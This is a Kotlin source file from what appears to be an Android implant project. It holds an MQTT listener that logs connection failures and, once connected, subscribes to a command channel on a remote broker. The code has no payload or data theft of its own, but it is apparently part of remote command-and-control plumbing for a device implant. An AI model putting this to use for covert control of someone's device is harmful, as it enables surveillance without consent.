package com.cooperthecoder.implant.command

import android.util.Log
import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.IMqttActionListener
import org.eclipse.paho.client.mqttv3.IMqttToken


class CommandConnectionListener(val client: MqttAndroidClient, val channel: String) : IMqttActionListener {

    companion object {
        const val DEFAULT_QOS = 0
        val TAG: String = CommandConnectionListener::class.java.name
    }

    override fun onSuccess(asyncActionToken: IMqttToken) {
        subscribeToCommandChannels()

    }

    override fun onFailure(asyncActionToken: IMqttToken, exception: Throwable) {
        Log.d(TAG, "Failed to connect to ${client.serverURI}")
        exception.printStackTrace()
    }

    fun subscribeToCommandChannels() {
        Log.d(TAG, "Connection successful! Subscribing to ${client.serverURI}/${client.clientId}")
        client.subscribe(channel, DEFAULT_QOS)
    }
}